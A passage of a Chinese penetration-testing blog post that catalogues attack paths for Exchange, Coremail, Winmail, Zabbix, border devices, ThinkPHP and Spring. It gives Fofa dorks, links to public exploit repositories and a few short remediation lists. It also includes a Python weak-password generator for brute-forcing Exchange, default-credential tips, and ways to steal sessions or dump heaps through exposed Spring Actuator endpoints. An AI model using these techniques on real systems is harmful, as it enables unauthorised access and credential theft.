&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mail.domain.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mail1.domain.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mail-hk.domain.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;owa.domain.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;exchange.domain.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;email.domain.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;outlook.domain.com
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;还有个很好用的域名, 这是outlook的自动发现域名&lt;/p&gt;
&lt;p&gt;&lt;code&gt;autodiscover.domain.com&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2.爆破Exchange&lt;/p&gt;
&lt;p&gt;这里两个漏洞都需要登录, 其实这个的弱口令不是很难找, 经常会成为企业的突破口&lt;/p&gt;
&lt;p&gt;通常这里的密码能横穿内网, 比如 VPN, OA, SSO&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Exchange&lt;/code&gt;通常有以下几个接口&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/owa&lt;/code&gt; 前台web登录, 一般可以爆破&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/ews&lt;/code&gt; 这里是ews的接口, 可以进行401认证爆破, 只需要(域)账号和密码, 不需要知道域名前缀, 更方便爆破&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/autodiscover/autodiscover.xml&lt;/code&gt; 自动发现接口, 同ews爆破&lt;/p&gt;
&lt;p&gt;3.爆破工具可使用 &lt;code&gt;owa&lt;/code&gt;用&lt;code&gt;burp&lt;/code&gt;, &lt;code&gt;ews&lt;/code&gt;用&lt;code&gt;ruler&lt;/code&gt;, &lt;code&gt;awvs&lt;/code&gt;(比较好用)&lt;/p&gt;
&lt;p&gt;sensepost/ruler: A tool to abuse Exchange services
&lt;a class=&#34;link&#34; href=&#34;https://github.com/sensepost/ruler&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/sensepost/ruler&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;4.弱口令爆破技巧, 爆破&lt;code&gt;Exchange&lt;/code&gt;相对比较好用, 直接生成企业特色弱口令&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import itertools
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;prefix = [&amp;#39;baidu&amp;#39;, &amp;#39;Baidu&amp;#39;]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;for x in [&amp;#39;&amp;#39;.join(x) for x in list(itertools.product(prefix, [&amp;#39;@&amp;#39;, &amp;#39;&amp;#39;], [&amp;#39;2019&amp;#39;, &amp;#39;2020&amp;#39;, &amp;#39;2018&amp;#39;, &amp;#39;123&amp;#39;, &amp;#39;1234&amp;#39;, &amp;#39;123456&amp;#39;], [&amp;#39;!&amp;#39;, &amp;#39;&amp;#39;, &amp;#39;.&amp;#39;]))] : print(x)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;baidu@2019!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;baidu@2019
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;baidu@2019.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;baidu@2020!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;baidu@2020
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;.........
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Baidu123456
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Baidu123456.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.及时更新补丁&lt;/p&gt;
&lt;p&gt;2.升级到最新版&lt;/p&gt;
&lt;p&gt;3.做好权限控制&lt;/p&gt;
&lt;h2 id=&#34;coremail-相关漏洞&#34;&gt;Coremail 相关漏洞&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Coremail 是国内使用量很大的邮件服务商, 包括网易邮箱的后端使用的也是coremail&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;
Coremail&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Coremail&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;Coremail&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;
Coremail-0day敏感文件泄露漏洞送附批量检测脚本_数据库_god_Zeo的博客-CSDN博客
&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/god_zzZ/article/details/92735189&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://blog.csdn.net/god_zzZ/article/details/92735189&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;yuxiaoyou123/coremail-exp
&lt;a class=&#34;link&#34; href=&#34;https://github.com/yuxiaoyou123/coremail-exp&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/yuxiaoyou123/coremail-exp&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;dpu/coremail-address-book: Coremail邮件系统组织通讯录导出脚本
&lt;a class=&#34;link&#34; href=&#34;https://github.com/dpu/coremail-address-book&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/dpu/coremail-address-book&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.这个找不到源码, 没法分析&lt;/p&gt;
&lt;p&gt;里面的密码也多半没啥用, 还不如邮件里搜索一下vpn/密码&lt;/p&gt;
&lt;p&gt;2.这个东西有几率收到ImageMagick影响(此处存疑, 我只在dnslog见过, 没有实锤)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.及时更新补丁&lt;/p&gt;
&lt;p&gt;2.升级到最新版&lt;/p&gt;
&lt;h2 id=&#34;winmail-相关漏洞&#34;&gt;Winmail 相关漏洞&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Winmail 是国内使用量较大的邮件服务商, 由于版本老旧, 有一些历史漏洞, 注入, 任意文件下载, 上传&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;
Winmail&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Winmail&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;Winmail-Server&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Winmail最新直达webshell 0day漏洞挖掘实录_91Ri.org
&lt;a class=&#34;link&#34; href=&#34;http://www.91ri.org/16519.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://www.91ri.org/16519.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;winmail过滤不严getshell+任意文件下载(需要登录邮箱）_黑客技术
&lt;a class=&#34;link&#34; href=&#34;http://www.hackdig.com/06/hack-36899.htm&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://www.hackdig.com/06/hack-36899.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Winmail普通用户可直接进入后台取得域名管理、用户管理等所有权限 | WooYun-2014-57890 | WooYun.org
&lt;a class=&#34;link&#34; href=&#34;https://php.mengsec.com/bugs/wooyun-2014-057890.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://php.mengsec.com/bugs/wooyun-2014-057890.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Winmail最新直达webshell 0day漏洞挖掘实录_91Ri.org
&lt;a class=&#34;link&#34; href=&#34;http://www.91ri.org/16519.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://www.91ri.org/16519.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;winmail过滤不严getshell+任意文件下载(需要登录邮箱）_黑客技术
&lt;a class=&#34;link&#34; href=&#34;http://www.hackdig.com/06/hack-36899.htm&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://www.hackdig.com/06/hack-36899.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Winmail普通用户可直接进入后台取得域名管理、用户管理等所有权限 | WooYun-2014-57890 | WooYun.org
&lt;a class=&#34;link&#34; href=&#34;https://php.mengsec.com/bugs/wooyun-2014-057890.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://php.mengsec.com/bugs/wooyun-2014-057890.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.这个邮箱很多高校在用, 通过分析补丁, 一些老版本没升级的话还是有问题, 最新版是6.5&lt;/p&gt;
&lt;p&gt;2.邮件系列老洞&lt;/p&gt;
&lt;p&gt;高屋建瓴之WebMail攻与防 – cyjay5un – 博客园
&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/cyjaysun/p/4378907.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.cnblogs.com/cyjaysun/p/4378907.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.及时更新补丁&lt;/p&gt;
&lt;p&gt;2.升级到最新版&lt;/p&gt;
&lt;h2 id=&#34;zabbix-相关漏洞&#34;&gt;Zabbix 相关漏洞&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Zabbix 由于监控着内网众多主机, 所以也是内网关注的重点, 主要是注入/弱口令/命令执行&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Zabbix&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Zabbix&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;Zabbix&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;记一次zabbix安装及漏洞利用getshell全过程 – 先知社区
&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/6874&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://xz.aliyun.com/t/6874&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Zabbix 最新 SQL 注入漏洞及 EXP – Jamin Zhang
&lt;a class=&#34;link&#34; href=&#34;https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;记一次zabbix安装及漏洞利用getshell全过程 – 先知社区
&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/6874&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://xz.aliyun.com/t/6874&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Zabbix 最新 SQL 注入漏洞及 EXP – Jamin Zhang
&lt;a class=&#34;link&#34; href=&#34;https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.这里如果 Zabbix 附近遇到 Grafana, 一般都是默认口令 admin/admin, 进后台查看数据源的位置, 如果有 Zabbix , 直接 f12 查看密码, 就可以登录 Zabbix 了&lt;/p&gt;
&lt;p&gt;2.另外 Grafana 后台sql查询处可以执行任意 sql, 其他数据源也一样见机行事&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.设置强口令&lt;/p&gt;
&lt;p&gt;2.尽量不要开放到公网&lt;/p&gt;
&lt;p&gt;3.限制来源IP&lt;/p&gt;
&lt;p&gt;4.升级到最新版&lt;/p&gt;
&lt;h2 id=&#34;边界产品防火墙-网关-路由器-vpn-相关漏洞&#34;&gt;边界产品(防火墙, 网关, 路由器, VPN) 相关漏洞&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;大型企业往往会配置一些边界设备来维护企业内外网通信, 这里也存在灯下黑的问题, 由于多数不开源, 漏洞主要以弱口令为主&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;防火墙, 网关, 路由器, VPN&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;防火墙, 网关, 路由器, VPN&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;
防火墙, 网关, 路由器, VPN 的名称&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;【安全设备】常见网络安全设备默认口令|IT2021.Com
&lt;a class=&#34;link&#34; href=&#34;https://www.it2021.com/security/614.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.it2021.com/security/614.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;渗透测试之各厂商防火墙登录IP、初始密码、技术支持
&lt;a class=&#34;link&#34; href=&#34;https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;【安全设备】常见网络安全设备默认口令|IT2021.Com
&lt;a class=&#34;link&#34; href=&#34;https://www.it2021.com/security/614.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.it2021.com/security/614.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;渗透测试之各厂商防火墙登录IP、初始密码、技术支持
&lt;a class=&#34;link&#34; href=&#34;https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.这个东西好多人不改默认口令, 就算改很多也是企业特色弱口令&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin&lt;/code&gt; &lt;code&gt;root&lt;/code&gt; &lt;code&gt;123456&lt;/code&gt; 永远的神&lt;/p&gt;
&lt;p&gt;内网的安全平台就是个漏洞指南&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.设置强口令&lt;/p&gt;
&lt;p&gt;2.限制来源IP&lt;/p&gt;
&lt;h2 id=&#34;第三节&#34;&gt;第三节&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;本节主要是针对一些常见组件和中间件的相关漏洞(大部分是要结合环境利用), 这里肯定篇幅有限, 难免有所遗漏, 欢迎补充&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;thinkphp-相关漏洞&#34;&gt;Thinkphp 相关漏洞&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Thinkphp 是国内很常见的PHP框架, 存在 远程代码执行/sql注入/反序列化/日志文件泄露等问题&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;
Thinkphp&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Thinkphp&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;X-Powered-By: ThinkPHP&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;ThinkPHP&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ThinkPHP漏洞总结 – 赛克社区
&lt;a class=&#34;link&#34; href=&#34;http://zone.secevery.com/article/1165&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://zone.secevery.com/article/1165&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;挖掘暗藏ThinkPHP中的反序列利用链 – 斗象能力中心
&lt;a class=&#34;link&#34; href=&#34;https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ThinkPHP使用不当可能造成敏感信息泄露&lt;em&gt;PHP_Fly&lt;/em&gt;鹏程万里-CSDN博客
&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/Fly_hps/article/details/81201904&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://blog.csdn.net/Fly_hps/article/details/81201904&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;DSMall代码审计 – 安全客，安全资讯平台
&lt;a class=&#34;link&#34; href=&#34;https://www.anquanke.com/post/id/203461&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.anquanke.com/post/id/203461&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;SkyBlueEternal/thinkphp-RCE-POC-Collection: thinkphp v5.x 远程代码执行漏洞-POC集合
&lt;a class=&#34;link&#34; href=&#34;https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Dido1960/thinkphp: thinkphp反序列化漏洞复现及POC编写
&lt;a class=&#34;link&#34; href=&#34;https://github.com/Dido1960/thinkphp&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/Dido1960/thinkphp&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;whirlwind110/tphack: Thinkphp3/5 Log文件泄漏利用工具
&lt;a class=&#34;link&#34; href=&#34;https://github.com/whirlwind110/tphack&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/whirlwind110/tphack&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.遇到Thinkphp的站点看一下版本, 或者直接扫一下, 看看有没有rce, 或者日志文件泄露&lt;/p&gt;
&lt;p&gt;2.自从我挖了thinphp的反序列化利用链以后, 这类型考题经常出没在ctf中&lt;/p&gt;
&lt;p&gt;3.实战中也看到偶尔有可以利用的情况, 运气好可能有惊喜, 刚好有篇新出的文章中使用到了这个漏洞&lt;/p&gt;
&lt;p&gt;DSMall代码审计 – 安全客，安全资讯平台
&lt;a class=&#34;link&#34; href=&#34;https://www.anquanke.com/post/id/203461&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.anquanke.com/post/id/203461&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.及时更新补丁&lt;/p&gt;
&lt;p&gt;2.升级到最新版Thinkphp&lt;/p&gt;
&lt;p&gt;3.前置WAF进行防护&lt;/p&gt;
&lt;h2 id=&#34;spring-系列漏洞&#34;&gt;Spring 系列漏洞&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Spring 是java web里最最最最常见的组件了, 自然也是研究的热门, 好用的漏洞主要是Spring Boot Actuators 反序列化, 火起来之前用了一两年, 效果很棒&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;
Spring xxx&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;X-Application-Context:&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;Spring-Framework&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Spring 框架漏洞集合 ~ Misaki’s Blog
&lt;a class=&#34;link&#34; href=&#34;https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Exploiting Spring Boot Actuators | Veracode blog
&lt;a class=&#34;link&#34; href=&#34;https://www.veracode.com/blog/research/exploiting-spring-boot-actuators&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.veracode.com/blog/research/exploiting-spring-boot-actuators&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Spring Boot Actuators配置不当导致RCE漏洞复现 – JF ‘ blog
&lt;a class=&#34;link&#34; href=&#34;https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;mpgn/Spring-Boot-Actuator-Exploit: Spring Boot Actuator (jolokia) XXE/RCE
&lt;a class=&#34;link&#34; href=&#34;https://github.com/mpgn/Spring-Boot-Actuator-Exploit&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/mpgn/Spring-Boot-Actuator-Exploit&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;artsploit/yaml-payload: A tiny project for generating SnakeYAML deserialization payloads
&lt;a class=&#34;link&#34; href=&#34;https://github.com/artsploit/yaml-payload&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/artsploit/yaml-payload&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.Spring Boot Actuators 相关漏洞超级好用&lt;/p&gt;
&lt;p&gt;很多厂商一开始都不懂, 直接对外开放&lt;code&gt;Spring Boot Actuators&lt;/code&gt;, 造成了有一段时间每个用了&lt;code&gt;Spring Boot&lt;/code&gt;的厂商都出了问题&lt;/p&gt;
&lt;p&gt;尤其是现在很多厂商使用微服务框架, 通过网关进行路由分发, 一些子目录通常对应一个&lt;code&gt;Spring Boot&lt;/code&gt;启动的服务&lt;/p&gt;
&lt;p&gt;然后子目录比如 &lt;code&gt;http://123.123.123.123/admin/env&lt;/code&gt; , &lt;code&gt;http://123.123.123.123/manager/env&lt;/code&gt;也都是可以出现的&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/env&lt;/code&gt; 可以偷session, RCE&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/heapdump&lt;/code&gt; 可以直接dump jvm中的对象, 使用 jhat 可以读取里面的对象&lt;/p&gt;
